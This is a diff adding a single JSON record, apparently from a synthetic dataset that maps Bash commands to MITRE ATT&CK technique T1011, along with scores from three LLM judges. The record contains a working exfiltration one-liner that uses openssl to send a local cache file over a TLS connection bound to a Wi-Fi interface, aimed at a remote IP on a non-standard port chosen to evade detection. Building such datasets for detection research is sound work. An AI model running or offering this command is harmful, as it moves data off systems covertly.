@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
+  "explanation": "Sends data over a TLS session explicitly bound to wlan2, using a non-standard port to minimize detection; this leverages a distinct wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Validate wlan2 as the alternate medium using iwconfig.",
+    "Bind the TLS client to wlan2\u2019s local IP to isolate the path from the primary channel.",
+    "Transmit the file over a high, uncommon port without altering system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-a13a4d10",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline is well-formed with balanced quoting, correct redirections, valid command substitution, and recognized openssl s_client options including -connect and -bind.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads the specified file and transmits it via a TLS session explicitly bound to the wlan2 interface\u2019s IPv4 address, effectively forcing Wi\u2011Fi egress and matching T1011\u2019s exfiltration over another network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.93,
+        "timestamp": "2025-10-01T01:39:06.453801Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), balanced quotes, valid redirection (>/dev/null 2>&1), proper command substitution ($()), and correct parameter syntax for all tools used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by first checking if wlan2 exists, then using openssl to establish a TLS connection explicitly bound to the wlan2 interface (a secondary network medium) to exfiltrate data from map.dat to a remote server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:39:10.072882Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command chaining, valid flags for all tools, proper command substitution, and balanced syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the claimed intent by explicitly binding the TLS exfiltration to the specified wireless interface (wlan2), leveraging a distinct network medium consistent with T1011, and uses a non-standard port for an attempted evasion.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:34:30.733529Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
